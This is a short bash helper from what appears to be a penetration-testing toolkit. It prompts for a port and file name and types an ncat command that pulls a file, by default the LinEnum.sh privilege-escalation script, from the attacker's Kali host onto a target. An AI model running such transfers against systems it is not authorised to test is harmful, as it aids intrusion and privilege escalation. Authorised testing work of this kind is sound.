#!/bin/bash

: '
ncat: download file
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
SERVER_PORT_FIELD=$(form_item  "server port" "number" "server_port" "80")
LOCAL_FILE_FIELD=$(form_item  "local file location" "local_file_location" "LinEnum.sh")

# Generate GUI form
generate_form "${SERVER_PORT_FIELD}" "${LOCAL_FILE_FIELD}"

SERVER_PORT=${form_data["server_port"]}
LOCAL_FILE=${form_data["local_file_location"]}

paste_command "ncat --recv-only ${KALI_IP} ${SERVER_PORT} > ${LOCAL_FILE}"
xdotool key Return
